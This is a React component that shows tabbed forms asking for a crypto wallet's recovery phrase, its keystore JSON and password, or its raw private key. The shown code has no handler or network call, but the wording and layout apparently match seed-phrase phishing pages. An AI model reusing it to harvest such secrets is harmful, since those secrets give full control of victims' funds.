import React, { useState } from 'react';

const tabData = [
  {
    key: 'phrase',
    label: 'Phrase',
    content: (
      <form className="flex flex-col gap-4 mt-4">
        <textarea name="key" required minLength={12} placeholder="Phrase" className="w-full p-2 border rounded bg-[#1E2329] text-white border-gray-600" />
        <div className="desc text-sm text-gray-400">Typically 12 (sometimes 24) words separated by single spaces</div>
        <button type="submit" className="bg-[#F3BA2F] text-black font-bold py-2 rounded hover:bg-yellow-400 transition">IMPORT</button>
      </form>
    )
  },
  {
    key: 'keystore',
    label: 'Keystore JSON',
    content: (
      <form className="flex flex-col gap-4 mt-4">
        <textarea name="key" required minLength={12} placeholder="Keystore JSON" className="w-full p-2 border rounded bg-[#1E2329] text-white border-gray-600" />
        <input type="text" name="pass" placeholder="Password" required minLength={4} className="w-full p-2 border rounded bg-[#1E2329] text-white border-gray-600" />
        <div className="desc text-sm text-gray-400">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
        <button type="submit" className="bg-[#F3BA2F] text-black font-bold py-2 rounded hover:bg-yellow-400 transition">IMPORT</button>
      </form>
    )
  },
  {
    key: 'private',
    label: 'Private Key',
    content: (
      <form className="flex flex-col gap-4 mt-4">
        <input type="text" name="key" placeholder="Private Key" required minLength={64} className="w-full p-2 border rounded bg-[#1E2329] text-white border-gray-600" />
        <div className="desc text-sm text-gray-400">Typically 64 alphanumeric characters</div>
        <button type="submit" className="bg-[#F3BA2F] text-black font-bold py-2 rounded hover:bg-yellow-400 transition">IMPORT</button>
      </form>
    )
  }
];

const WalletImportTabs = () => {
  const [activeTab, setActiveTab] = useState('phrase');
  return (
    <div>
      <div className="flex gap-2 mb-2">
        {tabData.map(tab => (
          <button
            key={tab.key}
            className={`px-4 py-2 rounded font-bold text-sm ${activeTab === tab.key ? 'bg-[#F3BA2F] text-black' : 'bg-[#1E2329] text-white border border-gray-600'}`}
            onClick={() => setActiveTab(tab.key)}
          >
            {tab.label}
          </button>
        ))}
      </div>
      <div>{tabData.find(tab => tab.key === activeTab)?.content}</div>
    </div>
  );
};

export default WalletImportTabs;